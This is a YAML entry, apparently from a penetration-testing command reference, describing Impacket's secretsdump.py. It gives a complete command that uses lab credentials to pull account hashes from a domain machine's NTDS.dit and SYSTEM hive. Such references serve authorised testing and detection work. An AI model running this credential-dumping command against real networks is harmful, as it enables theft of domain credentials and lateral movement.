---
description: |
  Impacket's secretsdump.py will perform various techniques to dump secrets from the remote machine without executing any agent. Techniques include reading SAM and LSA secrets from registries, dumping NTLM hashes, plaintext credentials, and kerberos keys, and dumping NTDS.dit. The following command will attempt to use the specified machines NTDS.dit and system file to extract the user account hashes associated with that machine.

  Command Reference:

  	Target IP: 10.10.10.2

  	Domain Controller: 10.10.10.1

  	Domain: test.local

  	Username: john

  	Password: password123

command: |
  python3 secretsdump.py -ntds C:\Windows\NTDS\ntds.dit -system C:\Windows\System32\Config\system -dc-ip 10.10.10.1 test.local/john:password123@10.10.10.2
items:
  - Password
  - Username
services:
  - Kerberos
  - NTLM
OS:
  - Linux
  - Windows
attack_types:
  - Exploitation
references:
  - https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py
  - https://riccardoancarani.github.io/2020-05-10-hunting-for-impacket/#secretsdumppy
---
